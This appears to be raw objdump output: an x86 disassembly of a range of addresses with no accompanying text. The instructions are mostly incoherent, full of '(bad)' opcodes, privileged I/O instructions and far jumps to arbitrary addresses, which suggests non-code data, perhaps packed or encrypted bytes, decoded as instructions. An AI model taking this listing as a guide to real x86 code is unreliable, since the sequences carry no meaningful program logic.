  4264b8:	dec    DWORD PTR [eax+0x6f]
  4264bb:	std    
  4264bc:	or     esi,DWORD PTR [ebp-0x4d]
  4264bf:	lods   eax,DWORD PTR ds:[esi]
  4264c0:	and    BYTE PTR [ecx],0xdb
  4264c3:	add    DWORD PTR [eax],eax
  4264c5:	stos   DWORD PTR es:[edi],eax
  4264c6:	add    eax,DWORD PTR [eax]
  4264c8:	add    BYTE PTR [edi-0x1c],dh
  4264cb:	sub    BYTE PTR [eax],cl
  4264cd:	aas    
  4264ce:	fcomp  QWORD PTR [edx+ebp*2]
  4264d1:	dec    edx
  4264d2:	mov    eax,0x6af01da3
  4264d7:	iret   
  4264d8:	(bad)  
  4264d9:	push   ds
  4264da:	test   DWORD PTR ds:0xbe64c764,ebx
  4264e0:	nop
  4264e1:	lahf   
  4264e2:	(bad)  
  4264e3:	xchg   edx,eax
  4264e4:	dec    edx
  4264e5:	xchg   esi,eax
  4264e6:	ins    BYTE PTR es:[edi],dx
  4264e7:	mov    ebp,ebx
  4264e9:	jno    0x4264df
  4264eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264ec:	xchg   esp,eax
  4264ed:	xchg   DWORD PTR fs:[ebx-0x30],ebp
  4264f1:	jl     0x426507
  4264f3:	sub    BYTE PTR [ebp+0x78],0xc8
  4264f7:	sub    ecx,ebx
  4264f9:	jp     0x42648f
  4264fb:	sub    al,0x22
  4264fd:	add    eax,DWORD PTR [esp+edx*8-0x5b]
  426501:	loopne 0x42648c
  426503:	push   ecx
  426504:	mov    ds:0xb2083e9c,al
  426509:	ret    0x6625
  42650c:	addr16 nop
  42650e:	fs xor al,0x21
  426511:	xor    bh,BYTE PTR [esp+edx*1+0x44889ef2]
  426518:	clc    
  426519:	adc    eax,0xc1880d75
  42651e:	inc    edx
  42651f:	inc    edi
  426520:	jle    0x426534
  426522:	dec    edx
  426523:	or     eax,0xe3192747
  426528:	in     eax,dx
  426529:	scas   al,BYTE PTR es:[edi]
  42652a:	bound  edi,QWORD PTR [esp+esi*2-0x35]
  42652e:	mov    ebp,0x7aeab624
  426533:	or     DWORD PTR [eax-0x5469658a],esi
  426539:	mov    eax,0x3c56f467
  42653e:	inc    esi
  42653f:	mov    ebx,0xb1c3c6f7
  426544:	stc    
  426545:	or     eax,0x530b496a
  42654a:	mov    edx,0xf0797b43
  42654f:	ins    BYTE PTR es:[edi],dx
  426550:	call   0x4d6e:0xcafb456a
  426557:	mov    al,0x7f
  426559:	jge    0x426532
  42655b:	gs jae 0x42653a
  42655e:	jno    0x426551
  426560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426561:	push   ebp
  426562:	mov    edi,0x58edca70
  426567:	mov    DWORD PTR [edi],edx
  426569:	inc    esp
  42656a:	aaa    
  42656b:	mov    ah,0xad
  42656d:	or     dh,dh
  42656f:	je     0x42652a
  426571:	iret   
  426572:	mov    DWORD PTR [edi+0x6821ae53],eax
  426578:	dec    esi
  426579:	cmp    edx,DWORD PTR [eax]
  42657b:	out    dx,eax
  42657c:	pop    ss
  42657d:	inc    ebx
  42657e:	jno    0x42656d
  426580:	outs   dx,BYTE PTR ds:[esi]
  426581:	cdq    
  426582:	sbb    ebp,edi
  426584:	mov    dh,0x61
  426586:	push   edx
  426587:	xor    cl,BYTE PTR [eax]
  426589:	add    dl,BYTE PTR [ecx-0x609cb1fd]
  42658f:	out    dx,al
  426590:	sbb    BYTE PTR [edi-0x1a],0x1a
  426594:	test   eax,0x82645c71
  426599:	ret    0x368a
  42659c:	daa    
  42659d:	xchg   ebp,eax
  42659e:	sub    al,0x5e
  4265a0:	es imul edx,esi,0x8638b93a
  4265a7:	sub    edi,DWORD PTR [edi]
  4265a9:	std    
  4265aa:	shl    ebx,cl
  4265ac:	shl    BYTE PTR [ebx-0x23],1
  4265af:	retf   
  4265b0:	aaa    
  4265b1:	or     eax,0x99f3423
  4265b6:	and    ebp,DWORD PTR [edi-0x75]
  4265b9:	cmc    
  4265ba:	sbb    DWORD PTR [ecx+edx*4+0x5ab0d775],esp
  4265c1:	imul   BYTE PTR [eax+edi*4+0x32]
  4265c5:	pop    ebx
  4265c6:	retf   0x44e
  4265c9:	loop   0x426611
  4265cb:	add    BYTE PTR [edi+0x18d2f8e2],0x40
  4265d2:	adc    dl,bl
  4265d4:	xchg   esi,eax
  4265d5:	das    
  4265d6:	sar    DWORD PTR [ebx],0x6c
  4265d9:	lahf   
  4265da:	ins    BYTE PTR es:[edi],dx
  4265db:	xchg   edi,eax
  4265dc:	(bad)  [edi+0x63c17906]
  4265e2:	cli    
  4265e3:	aad    0x4
  4265e5:	or     dl,BYTE PTR [esi+0x736ef622]
  4265eb:	push   edi
  4265ec:	sahf   
  4265ed:	and    edi,ebx
  4265ef:	and    al,ah
  4265f1:	ret    
  4265f2:	pop    ecx
  4265f3:	mov    edx,0xc7270e00
  4265f8:	mov    esp,0xa58159a7
  4265fd:	popf   
  4265fe:	cmc    
  4265ff:	add    ch,BYTE PTR [edx+eiz*2]
  426602:	adc    edx,DWORD PTR [edi]
  426604:	or     dl,bh
  426606:	mov    esp,0x8e12a92d
  42660b:	loop   0x426609
  42660d:	mov    bh,ah
  42660f:	sbb    DWORD PTR [edi],ecx
  426611:	mov    ah,0x25
  426613:	jnp    0x42664a
  426615:	add    BYTE PTR [ecx+edi*8],bh
  426618:	mov    ebx,0x1efc6bc
  42661d:	loopne 0x4265c2
  42661f:	daa    
  426620:	push   0x9df364cc
  426625:	sbb    cl,BYTE PTR [edi-0x33]
  426628:	fldcw  WORD PTR [edx-0x7a86b4cd]
  42662e:	jg     0x4265cc
  426630:	pop    ecx
  426631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426632:	es lahf 
  426634:	scas   eax,DWORD PTR es:[edi]
  426635:	cld    
  426636:	(bad)  
  426637:	ins    BYTE PTR es:[edi],dx
  426638:	push   ebp
  426639:	mov    ebp,0x50e3cbbe
  42663e:	cmp    DWORD PTR [eax-0x25],ebx
  426641:	adc    BYTE PTR ds:0xe043b72b,cl
  426647:	mov    al,ds:0x5c8ab488
  42664c:	dec    edx
  42664d:	imul   esi,DWORD PTR [ebp-0x64],0xffffffaa
  426651:	ret    
  426652:	int    0xdc
  426654:	loopne 0x426643
  426656:	cmp    eax,0x7f5d08e8
  42665b:	dec    eax
  42665c:	pmaddwd mm6,QWORD PTR [ebx+0x6e]
  426660:	and    BYTE PTR [edx],ch
  426662:	clc    
  426663:	hlt    
  426664:	adc    esp,DWORD PTR [esi+eiz*2-0x7302df66]
  42666b:	inc    ebx
  42666c:	jo     0x426613
  42666e:	pop    edx
  42666f:	mov    al,ds:0x7c10b757
  426674:	xor    bh,BYTE PTR [ebx+0x4c]
  426677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426678:	jns    0x42664b
  42667a:	aam    0x80
  42667c:	add    eax,0x389df1d3
  426681:	arpl   WORD PTR [edx+ebp*8],di
  426684:	shl    BYTE PTR ds:0xffe7f093,0x15
  42668b:	fisub  WORD PTR [edi]
  42668d:	outs   dx,BYTE PTR ds:[esi]
  42668e:	inc    esp
  42668f:	mov    edi,0x70d9dfa5
  426694:	fisub  DWORD PTR [esi+0x2e]
  426697:	gs std 
  426699:	jbe    0x4266cf
  42669b:	sbb    DWORD PTR [ebx+0x23],ebx
  42669e:	icebp  
  42669f:	loopne 0x4266fa
  4266a1:	adc    al,0xc
  4266a3:	cs xchg esi,eax
  4266a5:	retf   0xb07
  4266a8:	push   eax
  4266a9:	and    ch,bl
  4266ab:	pop    edi
  4266ac:	loop   0x42670b
  4266ae:	sbb    cl,dl
  4266b0:	jae    0x426691
  4266b2:	call   0xc0164564
  4266b7:	(bad)  
  4266b8:	xor    eax,0x75df695e
  4266bd:	pop    eax
  4266be:	xchg   DWORD PTR [eax],esi
  4266c0:	sbb    DWORD PTR [esi],ecx
  4266c2:	xchg   edx,eax
  4266c3:	loopne 0x42668a
  4266c5:	pop    DWORD PTR [edx-0x51c374f4]
  4266cb:	mov    dl,0x94
  4266cd:	pop    ecx
  4266ce:	xlat   BYTE PTR ds:[ebx]
  4266cf:	enter  0x7f57,0xf5
  4266d3:	pop    es
  4266d4:	fwait
  4266d5:	push   ds
  4266d6:	dec    ebx
  4266d7:	lea    edx,[esp+esi*2+0x575de5a]
  4266de:	stc    
  4266df:	lds    eax,FWORD PTR [bx]
  4266e2:	imul   BYTE PTR [ecx+edx*1-0x73]
  4266e6:	into   
  4266e7:	jno    0x4266e6
  4266e9:	xchg   edx,eax
  4266ea:	jne    0x42670d
  4266ec:	jne    0x4266e0
  4266ee:	jno    0x4266d7
  4266f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266f1:	rcl    ebp,cl
  4266f3:	inc    esp
  4266f4:	adc    ebp,edi
  4266f6:	dec    esi
  4266f7:	sbb    al,0x22
  4266f9:	rcl    BYTE PTR [edi-0x7bac7fc1],1
  4266ff:	hlt    
  426700:	mov    ecx,ecx
  426702:	sbb    BYTE PTR [edi],cl
  426704:	mov    dh,0x7
  426706:	(bad)  
  426707:	pop    ecx
  426708:	scas   al,BYTE PTR es:[edi]
  426709:	fld    QWORD PTR [ebx]
  42670b:	xchg   ebp,eax
  42670c:	jmp    FWORD PTR [eax-0x1356717f]
  426712:	ss lahf 
  426714:	mov    ?,WORD PTR [ebx-0x6983a9b9]
  42671a:	loopne 0x426705
  42671c:	mov    al,0xec
  42671e:	mov    edx,edi
  426720:	das    
  426721:	sub    ebp,DWORD PTR [esi+0x64]
  426724:	lods   eax,DWORD PTR ds:[esi]
  426725:	mov    cs,WORD PTR [esi+0x4]
  426728:	sbb    ah,BYTE PTR [esi+0x29469012]
  42672e:	jecxz  0x426725
  426730:	cmp    DWORD PTR [ecx-0x74],esi
  426733:	dec    dl
  426735:	inc    ecx
  426736:	push   0xffffffbc
  426738:	arpl   WORD PTR [edi+0x5cc6d687],di
  42673e:	inc    ebx
  42673f:	cmp    BYTE PTR [edi-0x5],bh
  426742:	jo     0x426745
  426744:	xor    al,0xd5
  426746:	pop    edx
  426747:	mov    bp,0xfbe4
  42674b:	rol    edi,0x5
  42674e:	mov    al,ds:0xcbe6cebb
  426753:	jb     0x426773
  426755:	jl     0x426728
  426757:	mov    ebp,0xd0eb2101
  42675c:	mov    al,0x3c
  42675e:	and    bh,dl
  426760:	mov    BYTE PTR [ebx-0x17],0x6a
  426764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426765:	adc    dh,bh
  426767:	mov    bl,0x2a
  426769:	xlat   BYTE PTR ds:[ebx]
  42676a:	dec    ecx
  42676b:	mov    al,0x76
  42676d:	ins    BYTE PTR es:[edi],dx
  42676e:	cmp    DWORD PTR [edx],ecx
  426770:	adc    DWORD PTR [edx-0x3f],ebx
  426773:	out    dx,eax
  426774:	sub    esi,ecx
  426776:	iret   
  426777:	mov    ah,0x86
  426779:	cs leave 
  42677b:	or     cl,BYTE PTR [esi-0x12f8bcdc]
  426781:	add    al,0x47
  426783:	cmp    dh,0xdb
  426786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426787:	jb     0x426733
  426789:	lods   eax,DWORD PTR ds:[esi]
  42678a:	fisttp DWORD PTR [ecx+0x6bec3791]
  426790:	mov    ebp,0x60507eb
  426795:	mov    ebx,0x3e480011
  42679a:	add    ah,BYTE PTR [eax]
  42679c:	fild   QWORD PTR [edi+ebx*1]
  42679f:	pop    edi
  4267a0:	xchg   esp,eax
  4267a1:	outs   dx,BYTE PTR ds:[esi]
  4267a2:	shl    DWORD PTR [esi+0x31],1
  4267a5:	pop    ecx
  4267a6:	pop    ds
  4267a7:	mov    eax,0xb49e8455
  4267ac:	icebp  
  4267ad:	les    eax,FWORD PTR [ebp+0x70]
  4267b0:	jns    0x426770
  4267b2:	cdq    
  4267b3:	(bad)  
  4267b4:	fidivr WORD PTR [ecx-0xa30f84d]
  4267ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267bb:	imul   edi,DWORD PTR [ebx+0x6f],0xffffffbe
  4267bf:	sbb    eax,edi
  4267c1:	push   edx
  4267c2:	cmp    eax,0xd9f78391
  4267c7:	cmp    bl,BYTE PTR [ecx]
  4267c9:	call   0x6232:0xef487dc8
  4267d0:	push   ds
  4267d1:	inc    edx
  4267d2:	test   eax,0x262c2051
  4267d7:	jg     0x42675e
  4267d9:	cwde   
  4267da:	lods   eax,DWORD PTR ds:[esi]
  4267db:	retf   0xab94
  4267de:	xlat   BYTE PTR ds:[ebx]
  4267df:	js     0x4267ed
  4267e1:	inc    ebx
  4267e2:	fidivr DWORD PTR [edx]
  4267e4:	fwait
  4267e5:	in     al,dx
  4267e6:	cmp    ah,BYTE PTR [edi]
  4267e8:	jno    0x426839
  4267ea:	cmp    ah,BYTE PTR [edi-0x1f]
  4267ed:	jns    0x426865
  4267ef:	int3   
  4267f0:	sub    al,0xa1
  4267f2:	xchg   esp,eax
  4267f3:	test   BYTE PTR [eax-0x62],dl
  4267f6:	das    
  4267f7:	or     eax,DWORD PTR fs:[esi+0x3d9770a4]
  4267fe:	push   cs
  4267ff:	mov    ds:0x102a54a1,eax
  426804:	pop    edx
  426805:	pop    es
  426806:	lods   eax,DWORD PTR ds:[esi]
  426807:	xor    BYTE PTR [ebx-0x24dc5606],al
  42680d:	in     eax,dx
  42680e:	or     eax,0x10e57dd3
  426813:	retf   
  426814:	neg    bh
  426816:	(bad)  
  426817:	jge    0x42685f
  426819:	ror    BYTE PTR [ecx+0x2a],0xad
  42681d:	stos   BYTE PTR es:[edi],al
  42681e:	sbb    al,BYTE PTR [ebp+0x18]
  426821:	sbb    esi,DWORD PTR [eax+0x478ce170]
  426827:	lahf   
  426828:	or     edi,DWORD PTR [ebp-0x68]
  42682b:	ret    0x78ce
  42682e:	retf   0x3f9c
  426831:	cmc    
  426832:	jmp    0x391ee620
  426837:	inc    edi
  426838:	imul   BYTE PTR [ebx-0x13]
  42683b:	iret   
  42683c:	ins    DWORD PTR es:[edi],dx
  42683d:	sub    dh,BYTE PTR [esi-0x56]
  426840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426841:	jmp    0x426881
  426843:	sar    DWORD PTR ds:0x9a124eac,0xdf
  42684b:	inc    esi
  42684c:	dec    ebp
  42684d:	ins    BYTE PTR es:[edi],dx
  42684e:	mov    al,0x86
  426850:	sar    DWORD PTR [edx+0x38],0x28
  426854:	fyl2x  
  426856:	daa    
  426857:	cmp    al,0x9c
  426859:	jecxz  0x4267e9
  42685b:	ss mov ecx,0x75c9ee1e
  426861:	add    BYTE PTR [eax+0x45a5f205],ah
  426867:	out    0xce,eax
  426869:	push   eax
  42686a:	leave  
  42686b:	sbb    al,0xc6
  42686d:	xchg   esi,eax
  42686e:	mov    ebx,0x5aa5d2e
  426873:	mov    eax,ds:0x0
	...
  426880:	add    cl,al
  426882:	into   
  426883:	psrld  mm1,QWORD PTR [edi]
  426886:	rcr    ebp,cl
  426888:	fistp  QWORD PTR [ebp+edi*8+0x37]
  42688c:	push   esp
  42688d:	call   0xcc8be7d8
  426892:	fiadd  WORD PTR [ecx]
  426894:	add    BYTE PTR [ebx+0x50000003],ch
  42689a:	mov    ebp,DWORD PTR [ebp-0x2d943e5c]
  4268a0:	mov    eax,ds:0xcac410fc
  4268a5:	jmp    0x426874
  4268a7:	sbb    al,0xc9
  4268a9:	cmp    esi,esi
  4268ab:	and    ah,ch
  4268ad:	test   DWORD PTR [edx+0x69f21d44],0x32babfbf
  4268b7:	test   eax,0x8d6a0be7
  4268bc:	xchg   edx,eax
  4268bd:	or     eax,0xefb3f80f
  4268c2:	je     0x426942
  4268c4:	(bad)  
  4268c5:	pop    edi
  4268c6:	arpl   sp,sp
  4268c8:	(bad)  
  4268c9:	jnp    0x426913
  4268cb:	icebp  
  4268cc:	dec    BYTE PTR [edx+edi*4+0x5c]
  4268d0:	int3   
  4268d1:	xchg   ecx,esp
  4268d3:	aam    0x25
  4268d5:	jbe    0x42686b
  4268d7:	dec    ebx
  4268d8:	jo     0x42688d
  4268da:	xchg   DWORD PTR [edi],ecx
  4268dc:	push   esp
  4268dd:	xchg   esp,eax
  4268de:	sub    dh,BYTE PTR [edx+0x4d]
  4268e1:	cmp    ah,BYTE PTR [edx]
  4268e3:	jb     0x4268d6
  4268e5:	ja     0x426887
  4268e7:	adc    dl,BYTE PTR [ebp-0x66db9684]
  4268ed:	nop
  4268ee:	test   BYTE PTR [ebx],dh
  4268f0:	stos   DWORD PTR es:[edi],eax
  4268f1:	and    dl,dl
  4268f3:	adc    esp,esi
  4268f5:	hlt    
  4268f6:	mov    dh,ah
  4268f8:	and    eax,0x60c4c638
  4268fd:	pop    edi
  4268fe:	xor    bl,BYTE PTR [eax+eax*8+0x6ecb0c24]
  426905:	or     eax,0x39aae396
  42690a:	pushf  
  42690b:	jne    0x42693b
  42690d:	sbb    eax,0x93590428
  426912:	lock scas al,BYTE PTR es:[edi]
  426914:	not    DWORD PTR [ecx]
  426916:	mov    al,0x1b
  426918:	hlt    
  426919:	into   
  42691a:	(bad)  
  42691b:	or     ebx,DWORD PTR [eax+0x49]
  42691e:	jmp    0x1df9a17f
  426923:	ja     0x4268f4
  426925:	inc    edi
  426926:	xchg   edi,eax
  426927:	jbe    0x42697a
  426929:	cmp    dh,BYTE PTR [ebx-0x8]
  42692c:	pusha  
  42692d:	cs jge 0x426947
  426930:	mov    ah,0x8b
  426932:	aas    
  426933:	lods   al,BYTE PTR ds:[esi]
  426934:	fs fmul st,st(7)
  426937:	in     eax,0x54
  426939:	ficom  WORD PTR [edi]
  42693b:	dec    ebp
  42693c:	popa   
  42693d:	or     al,0x78
  42693f:	ins    DWORD PTR es:[edi],dx
  426940:	cmp    ebx,DWORD PTR [ebp+ecx*4+0x32884cce]
  426947:	mov    eax,0x84a9828a
  42694c:	inc    esp
  42694d:	xor    BYTE PTR [ebx-0x626766b0],0x1
  426954:	dec    ebx
  426955:	sahf   
  426956:	or     ah,ch
  426958:	jp     0x4269a6
  42695a:	(bad)  
  42695b:	mov    eax,ecx
  42695d:	jmp    0xa0236db8
  426962:	clc    
  426963:	dec    edx
  426964:	outs   dx,BYTE PTR ds:[esi]
  426965:	ret    
  426966:	in     al,0x22
  426968:	sbb    al,0xf
  42696a:	pop    edx
  42696b:	xor    edi,DWORD PTR [edi-0x546f6f33]
  426971:	rcl    ebp,0x5d
  426974:	jae    0x4268fc
  426976:	and    DWORD PTR [esp+eax*2-0x7d6a1607],esp
  42697d:	popf   
  42697e:	pop    ecx
  426980:	mov    eax,ds:0x5983286b
  426985:	push   ecx
  426986:	and    BYTE PTR [esi+ebp*1],ah
  426989:	push   ebp
  42698a:	pop    esp
  42698b:	xchg   BYTE PTR [esi+0x8],dh
  42698e:	push   ebx
  42698f:	repnz cmp al,0x9f
  426992:	stos   DWORD PTR es:[edi],eax
  426993:	sbb    dl,cl
  426995:	ror    DWORD PTR [ecx],cl
  426997:	mov    esp,0xe0ebb462
  42699c:	jl     0x4269b4
  42699e:	mov    dl,0x6a
  4269a0:	cli    
  4269a1:	mov    bl,0xc0
  4269a3:	lods   al,BYTE PTR ds:[esi]
  4269a4:	inc    eax
  4269a5:	lahf   
  4269a6:	mov    edi,0xebfbb3bf
  4269ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269ac:	push   esi
  4269ad:	mov    dl,0xae
  4269af:	out    dx,al
  4269b0:	popf   
  4269b1:	scas   al,BYTE PTR es:[edi]
  4269b2:	dec    edx
  4269b3:	push   ebx
  4269b4:	or     al,0x26
  4269b6:	xchg   ecx,eax
  4269b7:	dec    esi
  4269b8:	and    dl,BYTE PTR [edi-0x7e54bdf2]
  4269be:	outs   dx,DWORD PTR ds:[esi]
  4269bf:	xor    eax,0xfa8fe309
  4269c4:	repnz lea edi,[esi+eax*8-0x3f87077f]
  4269cc:	mov    al,BYTE PTR [edx]
  4269ce:	jmp    0x388e:0x5cc6d1c8
  4269d5:	sbb    BYTE PTR [edx],bh
  4269d7:	cmp    BYTE PTR [eax],0x2b
  4269da:	imul   eax,DWORD PTR [edi],0x9d0024f4
  4269e0:	pop    edx
  4269e1:	lock icebp 
  4269e3:	jbe    0x4269a8
  4269e5:	xor    di,WORD PTR [ebx-0x5]
  4269e9:	ins    DWORD PTR es:[edi],dx
  4269ea:	add    BYTE PTR [edx+0x5afca08a],cl
  4269f0:	fsubp  st(4),st
  4269f2:	aaa    
  4269f3:	inc    eax
  4269f4:	gs mov ah,cl
  4269f7:	and    DWORD PTR [ebx],ecx
  4269f9:	inc    eax
  4269fa:	adc    DWORD PTR [esi-0x6],0x5
  4269fe:	mov    dl,0x7
  426a00:	repz jns 0x426a69
  426a03:	ffree  st(0)
  426a05:	jmp    0x5f008327
  426a0a:	hlt    
  426a0b:	sub    ebx,DWORD PTR [ecx+0x3f]
  426a0e:	jb     0x426996
  426a10:	mov    edi,0xe8deb5c9
  426a15:	add    ecx,esi
  426a17:	pop    esp
  426a18:	js     0x426a80
  426a1a:	fistp  QWORD PTR [ebx-0x7f67a00b]
  426a20:	jo     0x4269bf
  426a22:	sbb    BYTE PTR [ecx],ah
  426a24:	(bad)  
  426a26:	pop    esi
  426a27:	ja     0x426a08
  426a29:	mov    WORD PTR [ebx],fs
  426a2b:	xchg   edi,eax
  426a2c:	mov    cl,0x3c
  426a2e:	mov    esi,0xba668066
  426a33:	loopne 0x426a95
  426a35:	add    al,0xdb
  426a37:	pushf  
  426a38:	jp     0x426a9a
  426a3a:	test   eax,0xd8bd4ef3
  426a3f:	aas    
  426a40:	jae    0x426aa9
  426a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a43:	mov    ebp,0xf9c32768
  426a48:	and    eax,0x78373eaa
  426a4d:	fcom   DWORD PTR [ecx-0x3d687add]
  426a53:	xor    cl,ch
  426a55:	adc    BYTE PTR [ecx],0xdd
  426a58:	push   esi
  426a59:	mov    ds:0x5f32782b,al
  426a5e:	dec    ecx
  426a5f:	cmp    cl,BYTE PTR [ebx-0x23814c86]
  426a65:	sub    ebx,edi
  426a67:	mov    ebx,0xd15abf4e
  426a6c:	cdq    
  426a6d:	hlt    
  426a6e:	test   eax,esp
  426a70:	cmp    BYTE PTR [esi+0x213049fe],al
  426a76:	dec    edx
  426a77:	scas   al,BYTE PTR es:[edi]
  426a78:	call   0xe142:0x7e3c3f78
  426a7f:	push   0x11
  426a81:	fnsave [ebp+esi*1+0x20]
  426a85:	into   
  426a86:	dec    DWORD PTR [ebp-0x62]
  426a89:	aam    0x22
  426a8b:	push   ecx
  426a8c:	shr    BYTE PTR [edi-0x3d1b042a],0x75
  426a93:	test   DWORD PTR [ebx-0x4d],esi
  426a96:	fs fcom st(7)
  426a99:	clc    
  426a9a:	sub    eax,0x71302931
  426a9f:	lds    ebx,FWORD PTR [eax+ecx*8-0x53321baa]
  426aa6:	leave  
  426aa7:	iret   
  426aa8:	out    0xaa,al
  426aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426aab:	adc    DWORD PTR [edx],ebp
  426aad:	ja     0x426aa3
  426aaf:	ins    BYTE PTR es:[edi],dx
  426ab0:	fwait
  426ab1:	shl    BYTE PTR [edi+0xb0beed],1
  426ab7:	icebp  
  426ab8:	mov    ecx,0x41871c76
  426abd:	add    DWORD PTR [edi],esi
  426abf:	enter  0x7bc0,0x13
  426ac3:	fcomp  DWORD PTR [eax]
  426ac5:	xor    eax,0x867481ae
  426aca:	jnp    0x426afc
  426acc:	bound  ebp,QWORD PTR [ebx]
  426ace:	inc    edi
  426acf:	aad    0x17
  426ad1:	adc    ebx,0xb7c863ca
  426ad7:	scas   al,BYTE PTR es:[edi]
  426ad8:	jo     0x426aa5
  426ada:	lds    eax,FWORD PTR [esi+0x49]
  426add:	sbb    al,al
  426adf:	add    eax,0xc7a79537
  426ae4:	outs   dx,BYTE PTR ds:[esi]
  426ae5:	das    
  426ae6:	(bad)  
  426ae7:	pusha  
  426ae8:	imul   esi,edx,0x12
  426aeb:	pop    ecx
  426aec:	dec    esi
  426aed:	xchg   edx,eax
  426aee:	mov    esp,0xabeea9fc
  426af3:	adc    eax,DWORD PTR [ebp+0x29]
  426af6:	neg    DWORD PTR ds:0x9f313f95
  426afc:	leave  
  426afd:	and    BYTE PTR [esi+0x3],bl
  426b00:	idiv   DWORD PTR [edx+0x1ed0badb]
  426b06:	jns    0x426b6c
  426b08:	push   edi
  426b09:	(bad)  
  426b0a:	sbb    esi,DWORD PTR [edi]
  426b0c:	outs   dx,BYTE PTR ds:[esi]
  426b0d:	sub    eax,0xe1e3e2c6
  426b12:	mov    ebp,esi
  426b14:	sub    eax,0x7a2d5b99
  426b19:	cs (bad) 
  426b1b:	(bad)  
  426b1c:	scas   al,BYTE PTR es:[edi]
  426b1d:	jb     0x426b7b
  426b1f:	lods   al,BYTE PTR ds:[esi]
  426b20:	jmp    0xd6d7:0x2c3d7356
  426b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b28:	pop    esi
  426b29:	das    
  426b2a:	lahf   
  426b2b:	fmul   DWORD PTR [edi-0x75]
  426b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b2f:	mov    ds:0x20559cfa,al
  426b34:	and    DWORD PTR [eax+0x64],0x5c
  426b38:	sbb    ebp,DWORD PTR [edi+0x62bcc451]
  426b3e:	and    BYTE PTR [edx+edx*4],bl
  426b41:	(bad)  
  426b42:	and    al,0xfa
  426b44:	jns    0x426b68
  426b46:	out    0xb1,al
  426b48:	out    dx,al
  426b49:	fnsave [edx]
  426b4b:	int3   
  426b4c:	inc    ebp
  426b4d:	jo     0x426afc
  426b4f:	ins    DWORD PTR es:[edi],dx
  426b50:	fstp   QWORD PTR [esp+edx*8+0x4f]
  426b54:	inc    edx
  426b55:	or     BYTE PTR [esi],bl
  426b57:	xchg   edi,eax
  426b58:	call   0x1b1c3765
  426b5d:	mov    esp,0xde41fe4b
  426b62:	inc    esp
  426b63:	pop    es
  426b64:	popa   
  426b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b66:	into   
  426b67:	addr16 ja 0x426b62
  426b6a:	xlat   BYTE PTR ds:[ebx]
  426b6b:	jmp    0xc158b922
  426b70:	pusha  
  426b71:	or     BYTE PTR [eax],bl
  426b73:	ss add edi,ebx
  426b76:	js     0x426b35
  426b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b79:	push   esp
  426b7a:	add    DWORD PTR [esi+0x30],ebx
  426b7d:	and    DWORD PTR [edi+0x370d403],edx
  426b83:	retf   0x7a8b
  426b86:	dec    esi
  426b87:	xchg   DWORD PTR [esi+0x24e888b7],esi
  426b8d:	shl    DWORD PTR [edi+0x1a75005b],0x94
  426b94:	mov    ah,BYTE PTR [edi]
  426b96:	add    BYTE PTR [ecx+0x7a],ch
  426b99:	shl    DWORD PTR ds:[ebp-0x7d],cl
  426b9d:	jae    0x426b9f
  426b9f:	push   edi
  426ba0:	ror    DWORD PTR [esi],cl
  426ba2:	push   edi
  426ba3:	dec    edi
  426ba4:	stos   DWORD PTR es:[edi],eax
  426ba5:	call   0x47e8:0x30ca8d05
  426bac:	and    eax,0xd2d754e3
  426bb1:	inc    ebp
  426bb2:	push   cs
  426bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426bb4:	cmc    
  426bb5:	push   ebp
  426bb6:	jnp    0x426bef
  426bb8:	stos   BYTE PTR es:[edi],al
  426bb9:	push   ebp
  426bba:	dec    eax
  426bbb:	mov    ah,0x74
  426bbd:	jmp    0xe7e4411a
  426bc2:	fistp  WORD PTR [edi-0x6648a7e1]
  426bc8:	cld    
  426bc9:	mov    edx,0x45eda095
  426bce:	int    0x2c
  426bd0:	retf   
  426bd1:	push   esi
  426bd2:	loopne 0x426c38
  426bd4:	out    0xf8,eax
  426bd6:	jbe    0x426b68
  426bd8:	adc    eax,DWORD PTR [esi-0x4a]
  426bdb:	add    eax,0x5eceff1a
  426be0:	jnp    0x426ba0
  426be2:	icebp  
  426be3:	popf   
  426be4:	xor    esi,DWORD PTR [ecx+0x1dda3dca]
  426bea:	push   ds
  426beb:	aas    
  426bec:	mov    al,ds:0x2df07e2a
  426bf1:	test   edi,edi
  426bf3:	popa   
  426bf4:	xor    dl,BYTE PTR [eax]
  426bf6:	inc    esi
  426bf7:	dec    ebp
  426bf8:	ror    DWORD PTR [esi+0x29e73085],0xd3
  426bff:	jge    0x426b9b
  426c01:	inc    ebp
  426c02:	fild   QWORD PTR [edx]
  426c04:	xor    BYTE PTR ds:0xcd7f4acb,0x90
  426c0b:	sub    eax,0xe4e1bfc0
  426c10:	push   cs
  426c11:	dec    ebx
  426c12:	jecxz  0x426be6
  426c14:	push   ecx
  426c15:	push   es
  426c16:	mov    bh,0x5f
  426c18:	in     al,0xc8
  426c1a:	pop    ds
  426c1b:	xchg   edx,eax
  426c1c:	or     BYTE PTR [ecx],ch
  426c1e:	mov    ds:0xf17a6202,eax
  426c23:	xchg   esp,eax
  426c24:	add    eax,ecx
  426c26:	cwde   
  426c27:	sbb    esp,esp
  426c29:	(bad)  
  426c2a:	je     0x426c72
  426c2c:	int3   
  426c2d:	or     esi,DWORD PTR [edx+eax*8-0x2f]
  426c31:	mov    dl,0xb5
  426c33:	dec    ebp
  426c34:	in     al,dx
  426c35:	addr16 dec esp
  426c37:	jge    0x426c30
  426c39:	pop    ecx
  426c3a:	mov    dl,dl
  426c3c:	sbb    DWORD PTR [eax-0x2f],ebp
  426c3f:	dec    eax
  426c40:	in     al,dx
  426c41:	pop    esi
  426c42:	add    edx,edx
	...
  426c50:	add    al,dh
